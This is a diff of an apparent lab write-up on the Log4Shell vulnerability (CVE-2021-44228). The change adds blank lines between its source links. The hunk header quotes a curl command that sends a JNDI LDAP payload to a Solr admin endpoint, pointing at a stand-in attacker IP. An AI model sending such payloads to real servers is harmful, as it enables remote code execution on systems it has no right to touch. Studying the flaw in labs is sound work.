@@ -95,7 +95,11 @@ curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.I
 ## Source
 
 https://logging.apache.org/log4j/2.x/security.html
+
 https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+
 https://github.com/HynekPetrak/log4shell-finder
+
 https://www.fortinet.com/blog/threat-research/critical-apache-log4j-log4shell-vulnerability-what-you-need-to-know
+
 https://www.splunk.com/en_us/surge/log4shell-log4j-response-overview.html
